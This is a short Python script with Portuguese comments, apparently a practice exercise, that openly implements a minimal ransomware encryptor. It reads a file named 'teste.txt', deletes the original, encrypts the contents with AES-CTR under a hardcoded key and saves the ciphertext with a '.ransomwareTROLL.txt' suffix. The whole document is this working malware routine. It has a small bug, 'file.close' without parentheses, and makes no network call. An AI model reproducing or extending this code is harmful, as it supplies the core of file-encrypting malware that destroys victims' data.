import os
import pyaes

##Abrir arquivo a ser criptografado 

file_name = "teste.txt"
file = open("teste.txt", "rb")
file_data = file.read()
file.close

##Remover o arquivo 

os.remove(file_name)


##Chave de criptografia 

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

##Criptografar o arquivo 

crypto_data = aes.encrypt(file_data)

##Salvar o arquivo criptografado
new_file = file_name + ".ransomwareTROLL.txt"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()


